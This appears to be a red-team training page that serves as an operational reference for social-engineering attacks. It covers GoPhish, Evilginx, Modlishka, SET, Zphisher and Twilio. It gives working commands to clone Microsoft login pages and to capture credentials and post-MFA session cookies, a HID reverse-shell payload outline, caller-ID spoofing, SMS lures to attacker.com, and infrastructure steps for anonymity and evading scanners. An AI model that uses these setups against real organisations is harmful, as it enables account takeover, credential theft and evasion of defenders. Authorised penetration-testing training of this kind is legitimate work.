---
layout: training-page
title: "SE Tools Reference — Red Team Academy"
module: "Social Engineering"
tags:
  - social-engineering
  - tools
  - phishing
  - vishing
page_key: "se-tools"
render_with_liquid: false
---

# SE Tools Reference

A reference for the primary tooling used across social engineering operations — phishing frameworks, credential capture, infrastructure, and OSINT.

## Phishing Frameworks

### GoPhish

```
# Purpose: phishing campaign management — tracking, templates, results dashboard
# See: c2-frameworks/gophish for full guide

# Quick start
./gophish
# Admin UI: https://localhost:3333 (default admin / gophish)

# Key features:
# - Email templates with variable substitution {{.FirstName}}, {{.Email}}
# - Landing page cloning
# - Per-target tracking links
# - Campaign results dashboard (sent, opened, clicked, submitted)
# - Credential capture
```

### Evilginx

```
# Purpose: AiTM (Adversary-in-the-Middle) — captures credentials AND session cookies
# Bypasses MFA by intercepting the authenticated session token
# See: c2-frameworks/evilginx for full guide

# Critical advantage over GoPhish:
# GoPhish captures credentials only (useless against MFA)
# Evilginx captures the post-MFA session cookie = full account access

evilginx2
: config domain attacker.com
: config ip 1.2.3.4
: phishlets hostname o365 login.attacker.com
: phishlets enable o365
: lures create o365
: lures get-url 0
```

### Modlishka

```
# Purpose: reverse proxy phishing — similar to Evilginx, AiTM capability
# github.com/drk1wi/Modlishka

./Modlishka \
  -proxyDomain attacker.com \
  -target microsoft.com \
  -listeningPort 443 \
  -cert /path/to/cert.pem \
  -certKey /path/to/key.pem
```

## Infrastructure Tools

### swaks — SMTP Testing

```
# Test mail delivery and authentication
swaks --to target@corp.com \
      --from spoofed@attacker.com \
      --server mail.attacker.com \
      --auth LOGIN \
      --tls \
      --header "Subject: IT: Action Required" \
      --body "Please verify your account at https://attacker.com"

# Test SPF/DKIM/DMARC compliance
swaks --to test@mail-tester.com --from noreply@attacker.com \
      --server mail.attacker.com
```

### mail-tester.com

```
# Free spam score checker
# 1. Go to mail-tester.com — get a unique test address
# 2. Send your phishing email to that address
# 3. Check score — aim for 9+/10 before real send
# Checks: SPF, DKIM, DMARC, blacklists, content score, HTML quality
```

### YOURLS — URL Shortener

```
# Self-hosted URL shortener for clean phishing links
# github.com/YOURLS/YOURLS
# Install on VPS — creates yourshortdomain.com/abc

# Hides the real destination domain
# Track click-through rates with built-in analytics
```

## Social Engineering Toolkit (SET)

```
# See: web/social-engineer-toolkit for full guide
# Purpose: automated attack vectors including credential harvesting, payloads

setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner
# URL to clone: https://login.microsoftonline.com

# SET auto-clones, hosts locally, captures submissions
# Limitations: no per-target tracking, less polished than GoPhish
```

## Vishing Tools

### FreePBX / Asterisk

```
# Self-hosted PBX for spoofed outbound calls
# Requires SIP trunk (VoIP.ms, Twilio SIP, etc.)

# Install on VPS
apt install asterisk freepbx

# Configure trunk with spoofed CallerID
# Set outbound CallerID to target company's number
# Record and playback capabilities for automated vishing
```

### Twilio

```
# Programmatic calls and SMS — twilio.com
pip install twilio

from twilio.rest import Client
client = Client(account_sid, auth_token)

# Voice call
call = client.calls.create(
    twiml='<Response><Say>Hello, this is IT support.</Say></Response>',
    to="+15551234567",
    from_="+15559876543"
)

# SMS
msg = client.messages.create(
    body="Your VPN certificate expires today. Renew: https://vpn.attacker.com",
    from_="+15559876543",
    to="+15551234567"
)
```

## OSINT Tools for SE

```
theHarvester  — email enumeration from multiple sources
hunter.io     — email format discovery and verification
LinkedIn      — org chart, tools, employee profiling
Maltego       — relationship mapping
OSINT Framework — osintframework.com
Spokeo/Whitepages — phone number lookup
haveibeenpwned — breach checking for targets
trufflehog    — git secret scanning for intelligence gathering
```

## Campaign Tracking Spreadsheet Template

```
Target Name | Email | Sent | Opened | Clicked | Submitted | Notes
------------|-------|------|--------|---------|-----------|------
John Smith  | j@c.c | Y    | Y      | Y       | N         | Clicked, hesitated at form
Jane Doe    | j@c.c | Y    | N      | N       | N         | Likely filtered
...
```

---

## SET (Social Engineering Toolkit) — Full Coverage

### Installation

```bash
# Method 1: Package manager (Kali Linux)
sudo apt update && sudo apt install set

# Method 2: Git clone (always latest version)
git clone https://github.com/trustedsec/social-engineer-toolkit /opt/setoolkit
cd /opt/setoolkit
pip3 install -r requirements.txt
sudo python3 setup.py install

# Launch
sudo setoolkit
```

### Key Modules

SET's main menu structure:

```
1) Social-Engineering Attacks
2) Penetration Testing (Fast-Track)
3) Third Party Modules
4) Update the Social-Engineer Toolkit
5) Update SET configuration
6) Help, Credits, and About

# Primary path for SE operations:
Select 1 → Social-Engineering Attacks
```

### Spear-Phishing Attack Vector

```
# Menu path: 1 → 1 (Spear-Phishing Attack Vectors)

Options:
  1) Perform a Mass Email Attack
  2) Create a FileFormat Payload
  3) Create a Social-Engineering Template

# Single email attack:
# 1 → 1 → select payload type → enter target email → configure SMTP

# Mass mailer:
# 1 → 1 → select "Email Attack Mass Mailer" → import targets from file
# Target file format: email address per line

# File format payloads (use with caution — largely blocked by AV):
# Adobe PDF, Microsoft Word, Excel — all generate shellcode-embedded files
# More useful for understanding the technique than modern operational use
```

### Website Attack Vectors

```
# Menu path: 1 → 2 (Website Attack Vectors)

Sub-options:
  1) Java Applet Attack Method          (deprecated — Java disabled in browsers)
  2) Metasploit Browser Exploit Method  (browser exploits, limited modern use)
  3) Credential Harvester Attack Method (MOST USEFUL)
  4) Tabnabbing Attack Method
  5) Web Jacking Attack Method
  6) Multi-Attack Web Method
  7) HTA Attack Method
```

### Credential Harvester Attack Method

```
# Menu path: 1 → 2 → 3

Options:
  1) Web Templates   — pre-built templates (Google, Facebook, Twitter, etc.)
  2) Site Cloner     — clone any URL automatically
  3) Custom Import   — provide your own HTML

# Site cloner (most useful):
# Select 2 → Site Cloner
# Enter your IP address for the POST back: 1.2.3.4
# Enter the URL to clone: https://login.microsoftonline.com

# SET will:
# 1. Download the target page
# 2. Modify the form to POST credentials to your IP
# 3. Start a Python HTTP server on port 80
# 4. Display captured credentials in terminal

# Captured output example:
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: login=john.smith@contoso.com
POSSIBLE PASSWORD FIELD FOUND: passwd=SuperSecret123!
```

### Tabnabbing Attack

```
# Menu path: 1 → 2 → 4
# How it works:
# - Sends link to a benign page
# - When the browser tab loses focus (target switches tabs)
# - JavaScript replaces the page content with a phishing clone
# - When target returns to the tab: "Session expired — please log in again"
# - Target re-enters credentials on the now-malicious page

# Modern limitations:
# - Requires JavaScript execution
# - Modern browsers show the original URL in the tab still
# - Less effective than direct credential harvesting but stealthy
```

### HID Attack Vectors (Teensy/USB Rubber Ducky)

```
# Menu path: 1 → 6 (Arduino-Based Attack Vector)
# Generates HID (keyboard injection) payloads for:
# - Teensy USB
# - USB Rubber Ducky (via DuckyScript translation)

# Example: PowerShell reverse shell via HID
# SET generates the keystroke payload
# Device types in as if the user typed it
# Bypasses endpoint controls that block file-based execution

# Common HID payload:
# Opens PowerShell as admin → downloads and executes reverse shell
# Total injection time: ~3 seconds for a pre-written payload
```

---

## Evilginx — Full Setup and Operation

### Installation

```bash
# Install Go first (Evilginx requires Go 1.17+)
wget https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin

# Clone and build Evilginx
git clone https://github.com/kgretzky/evilginx2 /opt/evilginx2
cd /opt/evilginx2
make

# Or install pre-compiled binary:
wget https://github.com/kgretzky/evilginx2/releases/latest/download/evilginx-linux-amd64.zip
unzip evilginx-linux-amd64.zip

# Run (requires root for ports 80/443)
sudo ./evilginx -p phishlets/
```

### Configuration

```bash
# Initial setup inside evilginx:
: config domain attacker.com         # set your phishing domain
: config ip 1.2.3.4                  # set your server's external IP

# List available phishlets:
: phishlets

# Configure a phishlet (example: Office 365)
: phishlets hostname o365 login.attacker.com
# This means victims go to login.attacker.com
# Evilginx proxies to login.microsoftonline.com

: phishlets enable o365
# Evilginx auto-generates TLS certs via Let's Encrypt

# Create a lure (phishing URL)
: lures create o365
: lures get-url 0
# Returns: https://login.attacker.com/AbCdEfGh
```

### Capturing Sessions

```bash
# Monitor incoming sessions:
: sessions

# View a specific session's captured data:
: sessions 1

# Output shows:
# username:   john.smith@contoso.com
# password:   UserPassword123
# tokens:     (session cookies for persistent access)
# useragent:  Mozilla/5.0 ...
# remote_addr: 203.0.113.42

# Export session cookies for use in browser:
# Copy the cookie JSON → import via Cookie Editor browser extension
# Or use Python requests with the captured cookies
```

---

## GoPhish — Campaign Setup and Result Analysis

### Full Campaign Walkthrough

```bash
# Start GoPhish
./gophish
# Change default password immediately at https://localhost:3333

# Step 1: Create Sending Profile
# Settings → Sending Profiles → New Profile
# Name: "Postfix VPS"
# From: IT Support <noreply@attacker.com>
# Host: localhost:25 (or your SMTP server)
# Click "Send Test Email" to verify delivery

# Step 2: Create Email Template
# Email Templates → New Template
# Name: "O365 Password Expiry"
# Subject: [Action Required] Your Office 365 password expires in 24 hours
# HTML Body: (paste your cloned/crafted email HTML)
# Use variables: {{.FirstName}}, {{.URL}}, {{.Email}}
# Import Email: paste raw .eml file for exact cloning

# Step 3: Create Landing Page
# Landing Pages → New Page
# Name: "O365 Login Clone"
# Import Site: https://login.microsoftonline.com
# Enable "Capture Submitted Data": YES
# Enable "Capture Passwords": YES (confirm in-scope)
# Redirect To: https://office.com (after credential submission)

# Step 4: Create Target Group
# Users & Groups → New Group
# Import CSV:
cat targets.csv
# First Name,Last Name,Email,Position
# John,Smith,j.smith@contoso.com,IT Manager
# Jane,Doe,j.doe@contoso.com,Finance Director

# Step 5: Launch Campaign
# Campaigns → New Campaign
# Name: "Q1 SE Assessment — O365"
# Email Template: O365 Password Expiry
# Landing Page: O365 Login Clone
# URL: https://attacker.com (where GoPhish serves landing pages)
# Launch Date: [set to business hours]
# Sending Profile: Postfix VPS
# Groups: (select your target group)
# Launch Campaign
```

### Result Analysis

```bash
# Dashboard view:
# - Sent: total emails sent
# - Opened: targets who loaded the tracking pixel
# - Clicked: targets who clicked the phishing link
# - Submitted Data: targets who entered credentials
# - Email Reported: targets who used the "Report Phishing" button

# Export results:
# Campaign → Export CSV
# Includes: email, timestamp, IP, user-agent for each event

# Timeline view shows:
# - Time to first click (effectiveness metric)
# - Which recipients clicked multiple times
# - Which recipients submitted multiple times (different credentials?)

# Reported credentials (if password capture enabled):
# Campaigns → [Campaign Name] → View Results → Submitted Data
```

---

## Modlishka — Reverse Proxy Phishing

```bash
# Install
git clone https://github.com/drk1wi/Modlishka /opt/modlishka
cd /opt/modlishka
go build -o modlishka main.go

# Basic run (proxy Microsoft login)
sudo ./modlishka \
  -proxyDomain login.attacker.com \
  -target login.microsoftonline.com \
  -listeningPort 443 \
  -cert "$(cat /etc/letsencrypt/live/attacker.com/fullchain.pem)" \
  -certKey "$(cat /etc/letsencrypt/live/attacker.com/privkey.pem)"

# Modlishka vs Evilginx:
# Modlishka: simpler config, less maintained, no pre-built phishlets
# Evilginx:  more phishlets, active development, better community support
# Both: AiTM capability, session cookie capture
```

---

## Zphisher / HiddenEye — Template Phishing

```bash
# Zphisher — quick template-based phishing
# github.com/htr-tech/zphisher
git clone https://github.com/htr-tech/zphisher
cd zphisher
bash zphisher.sh

# Provides 30+ pre-built templates:
# Facebook, Instagram, Google, GitHub, Netflix, PayPal, etc.
# Tunnelling via ngrok, cloudflared, serveo

# WARNING: Noisy
# - Uses ngrok/cloudflared — these are heavily flagged by threat intel
# - Templates are well-known to security teams
# - Use only for quick PoC demonstrations, not real engagements
# - IP and tunnel domain will be logged by ngrok

# HiddenEye — similar to Zphisher
# github.com/DarkSecDevelopers/HiddenEye
# Additional templates, OTP capture capability
# Same noise/detection limitations as Zphisher
```

---

## Infrastructure Tools: Postfix, Namecheap, Cloudflare

### Postfix OPSEC Configuration

```bash
# Remove identifying headers from outbound mail
# /etc/postfix/main.cf — add:
# smtp_header_checks = regexp:/etc/postfix/header_checks

# /etc/postfix/header_checks:
# /^Received:.*with ESMTPSA/      IGNORE
# /^X-Originating-IP:/            IGNORE
# /^X-Mailer:/                    IGNORE
# /^X-Google-DKIM-Signature:/     IGNORE
# /^User-Agent:/                  IGNORE

sudo postmap /etc/postfix/header_checks
sudo systemctl reload postfix

# Verify headers are stripped:
swaks --to test@mail-tester.com --from noreply@attacker.com \
  --server localhost
# Review mail-tester.com results for identifying headers
```

### Namecheap Domain Registration OPSEC

```
Namecheap benefits for red team:
  - WHOIS privacy included free on most TLDs
  - Accepts PayPal and some crypto options
  - Easy DNS management
  - No-questions domain registration for most TLDs

OPSEC recommendations:
  - Use a separate account per client engagement
  - Enable WHOIS privacy immediately on registration
  - Use a VPN or Tor when managing registration (avoid home IP)
  - Pay with cryptocurrency or prepaid card for maximum anonymity
  - Register domain well before the engagement (aging)
```

### Cloudflare for Phishing Infrastructure

```bash
# Cloudflare as redirector — hides your actual server IP
# Target sees Cloudflare IP, not your VPS IP

# Setup:
# 1. Register domain with Namecheap
# 2. Add domain to Cloudflare (free plan sufficient)
# 3. Update nameservers at Namecheap to Cloudflare's
# 4. In Cloudflare: create A record pointing to your VPS IP
# 5. Enable "Proxied" (orange cloud) for the phishing subdomain

# Result:
# Victim DNS lookup → Cloudflare IP (not your VPS)
# Cloudflare forwards request to your VPS
# VPS sees Cloudflare IP in request (need CF-Connecting-IP header for real IP)

# Cloudflare Worker as redirector (optional — filters scanners):
# Deploy a Worker that only forwards requests matching target profile
# Worker checks User-Agent, IP ASN, referer before forwarding
# Returns 404 for scanner/bot traffic

# Note: Cloudflare may suspend phishing domains quickly if reported
# Use Cloudflare for redirectors pointing to a separate capture server
# Keep the capture server's IP hidden and rotate if burned
```

---

## Resources

- GoPhish — `github.com/gophish/gophish`
- Evilginx — `github.com/kgretzky/evilginx2`
- Modlishka — `github.com/drk1wi/Modlishka`
- SET — `github.com/trustedsec/social-engineer-toolkit`
- YOURLS — `yourls.org`
- Twilio — `twilio.com`
- Zphisher — `github.com/htr-tech/zphisher`
- MITRE T1566 — Phishing — `attack.mitre.org/techniques/T1566/`
- TrustedSec (SET authors) — `trustedsec.com`
